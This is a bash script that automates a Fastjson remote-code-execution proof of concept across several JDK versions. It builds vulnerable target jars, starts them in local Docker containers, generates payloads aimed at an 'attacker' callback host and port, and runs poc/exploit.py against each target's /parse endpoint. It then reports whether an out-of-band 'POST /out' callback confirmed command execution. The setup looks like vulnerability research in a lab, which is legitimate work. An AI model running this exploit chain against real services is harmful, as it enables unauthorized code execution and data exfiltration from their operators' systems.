#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

JDKS="${JDKS:-8 17 21 25}"
LPORT="${LPORT:-19090}"
WAIT="${WAIT:-18}"
MAX_FD="${MAX_FD:-256}"
BASE_PORT="${BASE_PORT:-18100}"
CMD="${CMD:-id-oob}"
BASE_TAG="${TAG:-t$(date +%s)}"
BOOT3_JAR="target/fastjson-rce-env-boot3-1.0.0.jar"
MVN="../tools/apache-maven-3.9.16/bin/mvn"

detect_host_ip() {
    if [ -n "${HOST_IP:-}" ]; then
        echo "$HOST_IP"
        return
    fi
    docker run --rm --add-host attacker:host-gateway eclipse-temurin:17-jre \
        sh -lc "awk '\$2 == \"attacker\" && \$1 ~ /^[0-9.]+$/ {print \$1; exit}' /etc/hosts" 2>/dev/null || true
}

HOST_IP="$(detect_host_ip)"
if [ -z "$HOST_IP" ]; then
    echo "[-] Could not detect Docker host-gateway IPv4. Set HOST_IP manually."
    echo "    Example: HOST_IP=192.168.65.254 JDKS=\"17 21 25\" ./scripts/test-jdks.sh"
    exit 1
fi

echo "[*] Docker host IP for callbacks: $HOST_IP"
echo "[*] JDK matrix: $JDKS"
echo "[*] Command: $CMD"

echo "[*] Building Boot3 target jar..."
if [ -x "$MVN" ]; then
    "$MVN" -Dmaven.repo.local=../.m2repo -f pom-boot3.xml package -DskipTests -q
else
    mvn -Dmaven.repo.local=../.m2repo -f pom-boot3.xml package -DskipTests -q
fi

overall=0
for jdk in $JDKS; do
    cname="upstream-fj-boot3-jdk${jdk}"
    target_port=$((BASE_PORT + jdk))
    image="eclipse-temurin:${jdk}-jre"
    jar="$BOOT3_JAR"
    mode="fd"
    if [ "$jdk" = "8" ]; then
        cname="upstream-fj-jdk8"
        jar="target/fastjson-rce-env-1.0.0.jar"
        mode="jdk8-http"
    fi

    echo
    echo "== JDK $jdk / host port $target_port =="
    echo "[*] Building payload mode=$mode ..."
    tag="${BASE_TAG}_jdk${jdk}_${mode//-/_}"
    bash scripts/build.sh "$HOST_IP" "$LPORT" "$CMD" "$mode" "$tag" >/tmp/fastjson-build-jdks.log
    tail -n 4 /tmp/fastjson-build-jdks.log

    docker rm -f "$cname" >/dev/null 2>&1 || true
    set +e
    docker run -d \
        --name "$cname" \
        --add-host attacker:host-gateway \
        -p "${target_port}:18080" \
        -v "$PWD/$jar:/app.jar:ro" \
        "$image" \
        java -jar /app.jar >/dev/null
    run_status=$?
    set -e
    if [ "$run_status" != 0 ]; then
        echo "[-] could not start eclipse-temurin:${jdk}-jre"
        overall=1
        continue
    fi

    ok=0
    for _ in $(seq 1 20); do
        if curl -fsS --max-time 2 "http://127.0.0.1:${target_port}/info" >/dev/null 2>&1; then
            ok=1
            break
        fi
        sleep 1
    done
    if [ "$ok" != 1 ]; then
        echo "[-] target did not start"
        docker logs --tail=80 "$cname" || true
        overall=1
        continue
    fi

    set +e
    python3 -u poc/exploit.py "$HOST_IP" "$LPORT" "http://127.0.0.1:${target_port}" /parse \
        --mode "$mode" --max-fd "$MAX_FD" --tag "$tag" --once --wait "$WAIT" \
        >"/tmp/fastjson-jdk${jdk}.log" 2>&1
    status=$?
    set -e

    if [ "$status" = 0 ]; then
        echo "[+] JDK $jdk: ID-OOB OK"
        grep -E -A1 -m1 '^\[\+\] OOB POST /out' "/tmp/fastjson-jdk${jdk}.log" || true
    else
        echo "[-] JDK $jdk: ID-OOB FAIL"
        tail -n 40 "/tmp/fastjson-jdk${jdk}.log"
        overall=1
    fi
done

exit "$overall"
